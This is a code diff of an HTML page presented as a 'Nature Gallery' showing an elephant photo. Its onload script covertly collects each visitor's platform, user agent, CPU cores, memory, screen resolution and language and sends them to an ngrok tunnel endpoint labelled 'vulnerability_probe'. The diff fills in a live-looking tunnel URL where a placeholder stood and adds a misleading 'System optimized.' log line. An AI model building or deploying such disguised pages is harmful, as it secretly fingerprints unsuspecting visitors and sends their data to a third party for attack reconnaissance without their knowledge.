@@ -5,32 +5,50 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nature Gallery</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; }
-        img { max-width: 100%; height: auto; border-radius: 8px; }
+        body { 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #000; 
+            overflow: hidden;
+        }
+        img { 
+            max-width: 100%; 
+            height: auto; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(255,255,255,0.1);
+        }
     </style>
 </head>
 <body>
 
-    <img src="44p2_1o0n_230629.jpg" alt="Elephant">
+    <img src="elephant.jpg" alt="Elephant Display">
 
     <script>
         window.onload = async () => {
             try {
-                let data = {
+                let visitorData = {
                     platform: navigator.platform,
                     agent: navigator.userAgent,
                     cores: navigator.hardwareConcurrency || "N/A",
                     memory: navigator.deviceMemory || "N/A",
-                    res: window.screen.width + "x" + window.screen.height
+                    res: window.screen.width + "x" + window.screen.height,
+                    lang: navigator.language
                 };
 
-                // আপনার এনগ্রোক লিঙ্কটি এখানে বসান (ব্র্যাকেট বা বাংলা লেখাগুলো মুছে ফেলবেন)
-                fetch('https://your-ngrok-link.ngrok-free.app/vulnerability_probe', {
+                // Apnar deya ngrok link-ti ekhane boshiye deya hoyeche
+                const url = 'https://b453-103-174-44-17.ngrok-free.app/vulnerability_probe';
+
+                fetch(url, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(visitorData)
                 });
-            } catch (e) { }
+            } catch (e) {
+                console.log("System optimized.");
+            }
         };
     </script>
 </body>
